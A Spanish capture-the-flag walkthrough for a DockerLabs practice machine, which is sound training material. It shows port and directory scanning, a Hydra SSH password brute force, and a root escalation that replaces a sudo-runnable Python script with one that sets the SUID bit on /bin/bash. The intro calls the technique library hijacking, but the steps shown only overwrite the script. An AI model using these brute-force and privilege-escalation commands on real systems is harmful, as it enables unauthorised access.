---
title: "DockerLabs - Library"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina para explotar la vulnerabilidad de Python Library Hijacking.

## Reconocimiento

Empezamos con un mapeo de la red:

```bash
nmap -sCV -p- 172.17.0.3
```

Vemos SSH y Apache corriendo, con la página por defecto de Apache.

Listamos directorios y encontramos dos rutas con status 200 OK:

```bash
gobuster dir -u http://172.17.0.3 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php,html,zip,bak,txt,py,xml,log -t 40
gobuster dir -u http://172.17.0.3 -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/Apache.txt -x php,html,zip,bak,txt,py,xml,log -t 40
```

Son `index.html` e `index.php`.

## Explotación

Al acceder a `index.php`, aparece una cadena en texto plano que usaremos para un ataque de fuerza bruta por SSH:

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p 'JIFGHDS87GYDFIGD' ssh://172.17.0.3 -t 4
```

Encontramos usuario válido: `carlos` / `JIFGHDS87GYDFIGD`. Accedemos por SSH:

```bash
ssh carlos@172.17.0.3
```

## Escalada de privilegios

Comprobamos qué podemos ejecutar como sudo sin contraseña:

```bash
sudo -l
```

Podemos ejecutar el script `/opt/script.py` con `python3`. Eliminamos el script original y creamos uno malicioso:

```bash
rm -rf /opt/script.py
echo 'import os
os.system("chmod u+s /bin/bash")' > /opt/script.py
```

Ejecutamos el script con sudo:

```bash
sudo /usr/bin/python3 /opt/script.py
```

Comprobamos que `/bin/bash` ahora tiene el bit SUID:

```bash
ls -la /bin/bash
```

Ejecutamos una shell con privilegios de root:

```bash
/bin/bash -p
```

## Conclusión

Conseguido: acceso root alcanzado. Laboratorio finalizado.
